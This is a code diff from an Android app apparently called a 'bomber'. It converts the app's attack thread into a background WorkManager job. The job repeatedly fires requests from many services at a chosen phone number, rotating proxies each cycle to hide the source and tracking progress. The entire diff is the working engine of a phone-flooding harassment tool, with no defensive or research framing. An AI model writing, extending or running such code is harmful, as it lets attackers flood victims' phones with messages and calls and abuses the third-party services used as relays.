@@ -1,12 +1,20 @@
-package com.dm.bomber.bomber;
+package com.dm.bomber.workers;
 
+import android.content.Context;
 import android.util.Log;
+
+import androidx.annotation.NonNull;
+import androidx.work.Data;
+import androidx.work.Worker;
+import androidx.work.WorkerParameters;
 
 import com.dm.bomber.services.Service;
 import com.dm.bomber.services.Services;
+import com.dm.bomber.ui.MainRepository;
 
 import org.jetbrains.annotations.NotNull;
 
+import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.TimeUnit;
@@ -16,21 +24,24 @@ import okhttp3.OkHttpClient;
 import okhttp3.Request;
 import okhttp3.Response;
 
-public class Attack extends Thread {
+public class AttackWorker extends Worker {
+
     private static final String TAG = "Attack";
 
-    private final Callback callback;
-    private final String countryCode;
-    private final String phone;
-    private final int numberOfCycles;
-    private final List<AuthProxy> proxies;
+    public static final String KEY_COUNTRY_CODE = "country_code";
+    public static final String KEY_PHONE = "phone";
+    public static final String KEY_NUMBER_OF_CYCLES = "number_of_cycles";
+    public static final String KEY_PROXY_ENABLED = "proxy_enabled";
+
+    public static final String KEY_PROGRESS = "progress";
+    public static final String KEY_MAX_PROGRESS = "max_progress";
 
     private int progress = 0;
 
     private CountDownLatch tasks;
 
-    private static final OkHttpClient.Builder clientBuilder = new OkHttpClient.Builder()
-            .callTimeout(10, TimeUnit.SECONDS)
+    private static OkHttpClient client = new OkHttpClient.Builder()
+            .callTimeout(7, TimeUnit.SECONDS)
             .addInterceptor(chain -> {
                 Request request = chain.request();
                 Log.v(TAG, String.format("Sending request %s", request.url()));
@@ -40,29 +51,34 @@ public class Attack extends Thread {
                         response.request().url(), response.code()));
 
                 return response;
-            });
+            }).build();
 
-    public Attack(Callback callback, String countryCode, String phone, int cycles, List<AuthProxy> proxies) {
-        super(phone);
+    public AttackWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
+        super(context, workerParams);
 
-        this.callback = callback;
-        this.countryCode = countryCode;
-        this.phone = phone;
-        this.proxies = proxies;
-
-        numberOfCycles = cycles;
+        setProgressAsync(new Data.Builder()
+                .putInt(KEY_PROGRESS, 0)
+                .putInt(KEY_MAX_PROGRESS, 0)
+                .build());
     }
 
+    @NonNull
     @Override
-    public void run() {
-        List<Service> usableServices = Services.getUsableServices(countryCode);
+    public Result doWork() {
+        List<AuthProxy> proxies = getInputData().getBoolean(KEY_PROXY_ENABLED, false) ?
+                new MainRepository(getApplicationContext()).getProxy() : new ArrayList<>();
 
-        callback.onAttackStart(usableServices.size(), numberOfCycles);
+        String countryCode = getInputData().getString(KEY_COUNTRY_CODE);
+        String phone = getInputData().getString(KEY_PHONE);
+
+        int numberOfCycles = getInputData().getInt(KEY_NUMBER_OF_CYCLES, 1);
+
+        List<Service> usableServices = Services.getUsableServices(countryCode);
         Log.i(TAG, String.format("Starting attack on +%s%s", countryCode, phone));
 
-        clientBuilder.proxy(null);
-
-        OkHttpClient client = null;
+        client = client.newBuilder()
+                .proxy(null)
+                .build();
 
         for (int cycle = 0; cycle < numberOfCycles; cycle++) {
             Log.i(TAG, String.format("Started cycle %s", cycle));
@@ -71,18 +87,16 @@ public class Attack extends Thread {
             if (!proxies.isEmpty()) {
                 AuthProxy authProxy = proxies.get(cycle % proxies.size());
 
-                clientBuilder.proxy(authProxy)
-                        .proxyAuthenticator(authProxy);
-
-                client = clientBuilder.build();
+                client = client.newBuilder()
+                        .proxy(authProxy)
+                        .proxyAuthenticator(authProxy)
+                        .build();
             }
 
-            if (client == null)
-                client = clientBuilder.build();
-
             for (Service service : usableServices) {
+                service.prepare(countryCode, phone);
+
                 try {
-                    service.prepare(countryCode, phone);
                     service.run(client, new com.dm.bomber.services.Callback() {
                         @Override
                         public void onError(Exception e) {
@@ -98,13 +112,19 @@ public class Attack extends Thread {
                             }
 
                             tasks.countDown();
-                            callback.onProgressChange(progress++);
+                            setProgressAsync(new Data.Builder()
+                                    .putInt(KEY_PROGRESS, progress++)
+                                    .putInt(KEY_MAX_PROGRESS, usableServices.size() * numberOfCycles)
+                                    .build());
                         }
                     });
                 } catch (StringIndexOutOfBoundsException e) {
                     Log.w(TAG, String.format("%s could not process the number", service.getClass().getName()));
                 }
             }
+
+            if (isStopped())
+                break;
 
             try {
                 tasks.await();
@@ -113,7 +133,7 @@ public class Attack extends Thread {
             }
         }
 
-        callback.onAttackEnd();
         Log.i(TAG, String.format("Attack on +%s%s ended", countryCode, phone));
+        return Result.success();
     }
 }
